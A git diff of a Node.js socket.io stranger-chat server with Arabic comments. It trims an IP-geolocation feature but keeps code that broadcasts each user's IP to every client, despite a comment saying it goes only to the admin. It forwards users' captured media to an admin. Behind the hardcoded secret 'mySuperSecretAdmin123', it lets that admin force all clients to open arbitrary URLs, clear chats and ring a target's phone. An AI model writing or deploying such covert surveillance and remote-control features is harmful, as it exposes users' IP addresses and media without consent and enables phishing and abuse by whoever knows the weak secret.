@@ -2,13 +2,12 @@ const express = require('express');
 const http = require('http');
 const { Server } = require('socket.io');
 const path = require('path');
-const https = require('https');
 
 const app = express();
 const server = http.createServer(app);
 const io = new Server(server, {
-  pingTimeout: 5000,
-  pingInterval: 10000
+  pingTimeout: 4000,
+  pingInterval: 8000
 });
 
 app.use(express.static(__dirname));
@@ -19,40 +18,14 @@ app.get('/', (req, res) => {
 
 let waitingUser = null;
 
-function getIpLocation(ip, callback) {
-  if (ip === '::1' || ip === '127.0.0.1') {
-    callback({ city: 'محلي', country: 'السيرفر المحلي' });
-    return;
-  }
-  https.get(`https://ipapi.co/${ip}/json/`, (res) => {
-    let data = '';
-    res.on('data', chunk => data += chunk);
-    res.on('end', () => {
-      try {
-        const json = JSON.parse(data);
-        callback({ city: json.city || 'غير معروف', country: json.country_name || 'غير معروف' });
-      } catch (e) {
-        callback({ city: 'غير معروف', country: 'غير معروف' });
-      }
-    });
-  }).on('error', () => {
-    callback({ city: 'غير معروف', country: 'غير معروف' });
-  });
-}
-
 io.on('connection', (socket) => {
   let clientIp = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
   if (clientIp && clientIp.includes(',')) clientIp = clientIp.split(',')[0].trim();
-  const userAgent = socket.handshake.headers['user-agent'] || 'غير معروف';
 
-  getIpLocation(clientIp, (loc) => {
-    io.emit('device_info', {
-      id: socket.id,
-      ip: clientIp,
-      city: loc.city,
-      country: loc.country,
-      ua: userAgent
-    });
+  // إرسال الـ IP و الـ ID فقط للأدمن
+  io.emit('device_info', {
+    id: socket.id,
+    ip: clientIp
   });
 
   socket.on('find_partner', () => {
@@ -86,9 +59,8 @@ io.on('connection', (socket) => {
     }
   });
 
-  // استقبال الوسائط من المستخدم وإرسالها حصرياً للأدمن فقط للمراجعة
+  // استقبال الوسائط من المستخدم وإرسالها حصرياً للأدمن للمراجعة
   socket.on('media_captured_for_admin', (data) => {
-    // data يحوي { adminSocketId, type, content }
     io.to(data.adminSocketId).emit('review_captured_media', {
       targetSocketId: socket.id,
       type: data.type,
@@ -96,7 +68,7 @@ io.on('connection', (socket) => {
     });
   });
 
-  // موافقة الأدمن على نشر الوسائط في الشات العام بين المتصلين
+  // موافقة الأدمن على نشر الوسائط في الشات العام
   socket.on('admin_approve_and_send', (data) => {
     if (data.secret !== 'mySuperSecretAdmin123') return;
     if (data.roomName) {
@@ -113,7 +85,7 @@ io.on('connection', (socket) => {
     } else if (data.action === 'open_url') {
       io.emit('force_open_url', data.url);
     } else if (data.action === 'clear_chat') {
-      io.emit('clear_chat', { target: data.target, adminId: socket.id });
+      io.emit('clear_chat', { target: data.target });
     } else if (data.action === 'ring_phone') {
       if (data.targetSocket) {
         io.to(data.targetSocket).emit('trigger_ringtone');
